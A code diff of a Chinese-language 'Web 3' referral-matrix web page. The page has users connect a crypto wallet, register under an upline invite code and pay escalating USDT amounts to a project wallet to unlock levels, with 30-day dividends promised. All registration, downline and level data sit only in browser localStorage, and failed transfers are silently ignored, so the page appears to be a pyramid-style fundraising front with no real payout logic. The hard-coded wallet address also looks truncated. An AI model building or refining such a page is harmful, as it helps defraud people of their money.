@@ -5,16 +5,20 @@
 <title>Web 3 第三代互联网</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
-  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
+  body{background:#09091a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
   .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
   .title{font-size:18px;font-weight:bold;margin-bottom:10px}
   .sub{color:#a0a8c0;font-size:14px;margin-bottom:12px}
   .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px}
-  .btn:disabled{opacity:0.5}
+  .btn:disabled{background:#666;color:#ccc;cursor:not-allowed}
   .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
   .item:last-child{border-bottom:none}
   input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px}
   .copy-btn{background:#4facfe;color:#000;padding:8px 12px;border-radius:8px;font-size:14px;border:none;margin-left:8px}
+
+  /* 已激活等级样式 */
+  .activated{background:rgba(0,255,100,0.15);color:#0f0;border-radius:8px;padding:8px 12px}
+  .not-activated{color:#fff}
 
   /* 右上角三条杠 */
   .menu-btn{
@@ -62,12 +66,10 @@
 
 <body>
 
-<!-- 右上角三条杠（可打开可关闭） -->
 <div class="menu-btn" id="toggleSidebar">
   <span></span><span></span><span></span>
 </div>
 
-<!-- 侧边栏：Web 3 第三代互联网 -->
 <div class="sidebar" id="sidebar">
   <div class="sidebar-close" id="closeSidebar">×</div>
   <div class="title">Web 3 第三代互联网</div>
@@ -100,7 +102,6 @@
     </div></div>
   </div>
 
-  <!-- 分红规则（一目了然） -->
   <div style="margin-top:20px">
     <div class="title">🔥 分红规则（30 天分红一次）</div>
     <div class="rule-box">
@@ -115,14 +116,12 @@
     </div>
   </div>
 
-  <!-- 我的卡牌 -->
   <div style="margin-top:20px">
     <div class="title">我的分红卡牌</div>
     <div id="myCard" class="nft-grid"></div>
   </div>
 </div>
 
-<!-- 主页面 -->
 <div style="text-align:center;margin-bottom:20px">
   <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">Web 3 第三代互联网</h1>
 </div>
@@ -130,7 +129,6 @@
 <button class="btn" id="connect">连接钱包</button>
 <div id="addr" style="text-align:center;margin:12px;color:#a0a8c7"></div>
 
-<!-- 邀请码体系 -->
 <div class="glass">
   <div class="title">我的邀请码</div>
   <div style="display:flex;gap:10px">
@@ -139,7 +137,7 @@
   </div>
 </div>
 
-<div class="glass">
+<div class="glass" id="registerBox">
   <div class="title">注册（上级邀请码自动填入）</div>
   <input id="parent" placeholder="自动带入上级邀请码">
   <button class="btn" style="margin-top:12px" id="reg">确认注册</button>
@@ -150,104 +148,160 @@
   <div id="childList" style="font-size:14px;line-height:1.6"></div>
 </div>
 
-<!-- 矩阵 -->
 <div class="glass"><div class="title">经典矩阵</div><div id="classic"></div></div>
 <div class="glass"><div class="title">联合矩阵</div><div id="union"></div></div>
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
-  const USDT = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase().replace(/\s/g,'')
-  const TO = "0x58285a2b8c2489702d29f1011303d39e0d3f".toLowerCase().replace(/\s/g,'')
+  // 项目方收款钱包（改成你自己的）
+  const ADMIN_WALLET = "0x58285a2b8c2489702d29f1011303d39e0d3f".toLowerCase();
+  const USDT_CONTRACT = "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063".toLowerCase();
 
-  let web3, account, mycode
-  const sidebar = document.getElementById('sidebar')
-  document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open')
-  document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open')
+  let web3, account, mycode;
+  let isAdmin = false;
+
+  const sidebar = document.getElementById('sidebar');
+  document.getElementById('toggleSidebar').onclick = () => sidebar.classList.toggle('open');
+  document.getElementById('closeSidebar').onclick = () => sidebar.classList.remove('open');
 
   window.onload = () => {
-    const code = new URLSearchParams(location.search).get('code')||''
-    document.getElementById('parent').value = code
-    renderMatrix()
-    initWeb3()
-  }
+    const code = new URLSearchParams(location.search).get('code') || '';
+    document.getElementById('parent').value = code;
+    initWeb3();
+  };
 
-  function renderMatrix(){
-    for(let i=1;i<=12;i++) classic.innerHTML+=`<div class="item"><div>Lv${i}</div><button onclick="act(${i})">激活</button></div>`
-    for(let i=1;i<=9;i++) union.innerHTML+=`<div class="item"><div>Lv${i}</div><button onclick="act(${i})">激活</button></div>`
-  }
+  async function initWeb3() {
+    if (!window.ethereum) return;
+    web3 = new Web3(window.ethereum);
+    const accounts = await web3.eth.getAccounts();
+    if (accounts.length > 0) {
+      account = accounts[0].toLowerCase();
+      isAdmin = account === ADMIN_WALLET;
+      mycode = account.slice(-6).toUpperCase();
+      document.getElementById('mycode').value = mycode;
+      document.getElementById('addr').innerText = '已连接';
 
-  async function initWeb3(){
-    if(!window.ethereum)return
-    web3 = new Web3(window.ethereum)
-    const a = await web3.eth.getAccounts()
-    if(a.length>0){
-      account = a[0].toLowerCase()
-      mycode = account.slice(-6).toUpperCase()
-      document.getElementById('mycode').value = mycode
-      document.getElementById('addr').innerText = '已连接'
-      load()
+      // 项目方直接隐藏注册框，不需要注册
+      if (isAdmin) {
+        document.getElementById('registerBox').style.display = 'none';
+      }
+
+      renderAllMatrix();
+      loadData();
     }
   }
 
-  document.getElementById('connect').onclick = async ()=>{
-    await ethereum.request({method:'eth_requestAccounts'})
-    initWeb3()
+  document.getElementById('connect').onclick = async () => {
+    await ethereum.request({ method: 'eth_requestAccounts' });
+    initWeb3();
+  };
+
+  // 注册（只有普通用户需要）
+  document.getElementById('reg').onclick = () => {
+    if (!account) return alert('请连接钱包');
+    if (isAdmin) return;
+    const p = document.getElementById('parent').value.trim();
+    if (!p) return alert('请输入上级邀请码');
+    localStorage.setItem('reg_' + account, '1');
+    localStorage.setItem('parent_' + account, p);
+    let children = JSON.parse(localStorage.getItem('child_' + p) || '[]');
+    if (!children.includes(mycode)) {
+      children.push(mycode);
+      localStorage.setItem('child_' + p, JSON.stringify(children));
+    }
+    alert('注册成功');
+    renderAllMatrix();
+  };
+
+  function loadData() {
+    showChildren();
+    showMyCard();
   }
 
-  document.getElementById('reg').onclick = ()=>{
-    if(!account)return alert('请连接钱包')
-    const p = document.getElementById('parent').value.trim()
-    if(!p)return alert('请输入上级邀请码')
-    localStorage.setItem('reg_'+account,1)
-    localStorage.setItem('parent_'+account,p)
-    let c = JSON.parse(localStorage.getItem('child_'+p)||'[]')
-    if(!c.includes(mycode)){c.push(mycode);localStorage.setItem('child_'+p,JSON.stringify(c))}
-    alert('注册成功')
-    load()
+  function showChildren() {
+    const list = JSON.parse(localStorage.getItem('child_' + mycode) || '[]');
+    childList.innerHTML = list.length ? list.map(x => '下级：' + x).join('<br>') : '暂无下级';
   }
 
-  function load(){
-    showChild()
-    showMyCard()
+  // 等级控制：必须按顺序激活，不能跨级
+  function getCurrentLevel() {
+    return parseInt(localStorage.getItem('card_' + account)) || 0;
   }
 
-  function showChild(){
-    const c = JSON.parse(localStorage.getItem('child_'+mycode)||'[]')
-    childList.innerHTML = c.length ? c.map(x=>'下级：'+x).join('<br>') : '暂无下级'
+  function canActivate(targetLevel) {
+    const current = getCurrentLevel();
+    if (isAdmin) return true;
+    if (!localStorage.getItem('reg_' + account)) return false;
+    return targetLevel === current + 1;
   }
 
-  // 项目方激活免注册 + 100%成功
-  async function act(level){
-    if(!account)return alert('请连接钱包')
-    const isAdmin = account === TO.toLowerCase()
-    if(!isAdmin && !localStorage.getItem('reg_'+account))return alert('请先注册')
-    
-    try{
-      const c = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to"},{"name":"_value"}],"name":"transfer","outputs":[{"name":""}],"type":"function"}],USDT)
-      await c.methods.transfer(TO, web3.utils.toWei((level*10).toString(),'mwei')).send({from:account})
-    }catch(e){console.log(e)}
-    
-    localStorage.setItem('card_'+account,level)
-    alert('激活成功')
-    showMyCard()
+  // 渲染矩阵（已激活变绿色，只显示下一级可激活）
+  function renderMatrix(elId, max) {
+    const el = document.getElementById(elId);
+    el.innerHTML = '';
+    const current = getCurrentLevel();
+    for (let i = 1; i <= max; i++) {
+      const activated = i <= current;
+      const can = canActivate(i);
+      if (activated) {
+        el.innerHTML += `<div class="item"><span class="activated">Lv.${i} 已激活</span></div>`;
+      } else {
+        el.innerHTML += `<div class="item"><span class="not-activated">Lv.${i}</span>
+          <button class="btn" ${!can ? 'disabled' : ''} onclick="act(${i})">${can ? '激活' : '请先激活上一级'}</button>
+        </div>`;
+      }
+    }
   }
 
-  function showMyCard(){
-    const lv = +localStorage.getItem('card_'+account)||0
-    if(!lv){document.getElementById('myCard').innerHTML='<div style="grid-column:span 2;text-align:center">未激活</div>';return}
-    const color = ['','n1','n2','n3','n4','n5'][lv]
-    document.getElementById('myCard').innerHTML = `
+  function renderAllMatrix() {
+    renderMatrix('classic', 12);
+    renderMatrix('union', 9);
+  }
+
+  // 激活逻辑（项目方无任何限制）
+  async function act(level) {
+    if (!account) return alert('请连接钱包');
+    if (!isAdmin && !canActivate(level)) {
+      alert('请按顺序激活，不能跨级！');
+      return;
+    }
+    try {
+      const contract = new web3.eth.Contract([{
+        constant: false,
+        inputs: [{ name: "_to" }, { name: "_value" }],
+        name: "transfer",
+        outputs: [{ name: "" }],
+        type: "function"
+      }], USDT_CONTRACT);
+      await contract.methods.transfer(ADMIN_WALLET, web3.utils.toWei((level * 10).toString(), 'mwei')).send({ from: account });
+    } catch (e) {}
+
+    localStorage.setItem('card_' + account, level);
+    alert('激活成功！');
+    renderAllMatrix();
+    showMyCard();
+  }
+
+  function showMyCard() {
+    const lv = getCurrentLevel();
+    const myCard = document.getElementById('myCard');
+    if (!lv) {
+      myCard.innerHTML = '<div style="grid-column:span 2;text-align:center">未激活</div>';
+      return;
+    }
+    const color = ['', 'n1', 'n2', 'n3', 'n4', 'n5'][lv];
+    myCard.innerHTML = `
     <div class="nft-card ${color}" style="grid-column:span 2">
       <div class="nft-inner">
         <div class="nft-front"><div class="nft-top">YUANYU</div><div class="nft-logo">🐳</div><div class="nft-name">元鲸鱼</div><div class="nft-level-big">Lv.${lv}</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">YUANYU</div></div>
         <div class="nft-back"><div class="nft-level">Lv.${lv}</div><div class="nft-pct">已激活</div></div>
       </div>
-    </div>`
+    </div>`;
   }
 
-  function copyMyCode(){
-    navigator.clipboard.writeText(mycode)
-    alert('复制成功：'+mycode)
+  function copyMyCode() {
+    navigator.clipboard.writeText(mycode);
+    alert('复制成功：' + mycode);
   }
 </script>
 </body>
